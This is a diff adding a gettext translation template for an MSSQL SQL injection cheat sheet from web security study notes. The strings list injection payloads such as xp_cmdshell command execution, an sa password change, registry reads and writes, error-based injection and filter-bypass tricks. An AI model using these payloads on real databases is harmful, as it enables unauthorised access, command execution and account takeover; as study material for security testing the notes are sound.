@@ -1,0 +1,373 @@
+# SOME DESCRIPTIVE TITLE.
+# Copyright (C) 2019-2026, Lyle
+# This file is distributed under the same license as the Web安全学习笔记 package.
+# FIRST AUTHOR <EMAIL@ADDRESS>, 2026.
+#
+msgid ""
+msgstr ""
+"Project-Id-Version: Web安全学习笔记 1.0\n"
+"Report-Msgid-Bugs-To: \n"
+"POT-Creation-Date: 2026-06-17 07:02+0800\n"
+"PO-Revision-Date: YEAR-MO-DA HO:MI+ZONE\n"
+"Last-Translator: FULL NAME <EMAIL@ADDRESS>\n"
+"Language: en\n"
+"Language-Team: en <LL@li.org>\n"
+"Plural-Forms: nplurals=2; plural=(n != 1);\n"
+"MIME-Version: 1.0\n"
+"Content-Type: text/plain; charset=utf-8\n"
+"Content-Transfer-Encoding: 8bit\n"
+"Generated-By: Babel 2.18.0\n"
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:2
+msgid "SQL Server Payload"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:5
+msgid "常见Payload"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:6
+msgid "Version"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:7
+msgid "``SELECT @@version``"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:8
+msgid "``SELECT SERVERPROPERTY('Edition');``"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:9
+msgid "``SELECT SERVERPROPERTY('EngineEdition');``"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:10
+msgid "Comment"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:11
+msgid "``SELECT 1 -- comment``"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:12
+msgid "``SELECT /*comment*/1``"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:13
+msgid "Space"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:14
+msgid "``0x01 - 0x20``"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:15
+msgid "用户信息"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:16
+msgid "``SELECT user_name()``"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:17
+msgid "``SELECT system_user``"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:18
+msgid "``SELECT user``"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:19
+msgid "``SELECT loginame FROM master..sysprocesses WHERE spid = @@SPID``"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:20
+msgid "用户权限"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:21
+msgid "``select IS_SRVROLEMEMBER('sysadmin')``"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:22
+msgid "``select IS_SRVROLEMEMBER('db_owner')``"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:23
+msgid "List User"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:24
+msgid "``SELECT name FROM master..syslogins``"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:25
+msgid "数据库信息"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:26
+msgid "``SELECT name FROM master..sysdatabases``"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:27
+msgid ""
+"``select concat_ws(table_schema,table_name,column_name) from "
+"information_schema.columns``"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:28
+msgid "``select quotename(name) from master..sysdatabases FOR XML PATH('')``"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:29
+msgid "执行命令"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:30
+msgid "``EXEC xp_cmdshell 'net user'``"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:31
+msgid "Ascii"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:32
+msgid "``SELECT char(0x41)``"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:33
+msgid "``SELECT ascii('A')``"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:34
+msgid "``SELECT char(65)+char(66)`` => return ``AB``"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:35
+msgid "Delay"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:36
+msgid "``WAITFOR DELAY '0:0:3'`` pause for 3 seconds"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:37
+msgid "Change Password"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:38
+msgid "``ALTER LOGIN [sa] WITH PASSWORD=N'NewPassword'``"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:39
+msgid "Trick"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:40
+msgid "``id=1 union:select password from:user``"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:41
+msgid "文件读取"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:42
+msgid "OpenRowset"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:43
+msgid "当前查询语句"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:44
+msgid ""
+"``select text from sys.dm_exec_requests cross apply "
+"sys.dm_exec_sql_text(sql_handle)``"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:45
+msgid "hostname"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:46
+msgid "用于判断是否站库分离"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:47
+msgid "``select host_name()``"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:48
+msgid "``exec xp_getnetname``"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:49
+msgid "服务器信息"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:50
+msgid "``exec xp_msver``"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:51
+msgid "系统配置"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:52
+msgid "``select * from sys.configurations;``"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:55
+msgid "注册表读写"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:56
+msgid "``xp_regread``"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:57
+msgid ""
+"``exec xp_regread N'HKEY_LOCAL_MACHINE', "
+"N'SYSTEM\\CurrentControlSet\\Services\\MSSEARCH'``"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:58
+msgid "``xp_regwrite``"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:59
+msgid "``xp_regdeletvalue``"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:60
+msgid "``xp_regdeletkey``"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:61
+msgid "``xp_regaddmultistring``"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:64
+msgid "报错注入"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:65
+msgid "``1=convert(int,(db_name()))``"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:68
+msgid "常用函数"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:69
+msgid "SUSER_NAME()"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:70
+msgid "USER_NAME()"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:71
+msgid "PERMISSIONS()"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:72
+msgid "DB_NAME()"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:73
+msgid "FILE_NAME()"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:74
+msgid "TYPE_NAME()"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:75
+msgid "COL_NAME()"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:78
+msgid "DNS OOB"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:79
+msgid "fn_xe_file_target_read_file"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:80
+msgid "fn_get_audit_file"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:81
+msgid "fn_trace_gettable"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:84
+msgid "其他常用存储过程"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:85
+msgid "sp_execute_external_script"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:86
+msgid "sp_makewebtask"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:87
+msgid "sp_OACreate"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:88
+msgid "sp_OADestroy"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:89
+msgid "sp_OAGetErrorInfo"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:90
+msgid "sp_OAGetProperty"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:91
+msgid "sp_OAMethod"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:92
+msgid "sp_OASetProperty"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:93
+msgid "sp_OAStop"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:94
+msgid "xp_cmdshell"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:95
+msgid "xp_dirtree"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:96
+msgid "xp_enumerrorlogs"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:97
+msgid "xp_enumgroups"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:98
+msgid "xp_fixeddrives"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:99
+msgid "xp_getfiledetails"
+msgstr ""
+
+#: ../../source/vuln/sql/cheatsheet/mssql.rst:100
+msgid "xp_loginconfig"
+msgstr ""
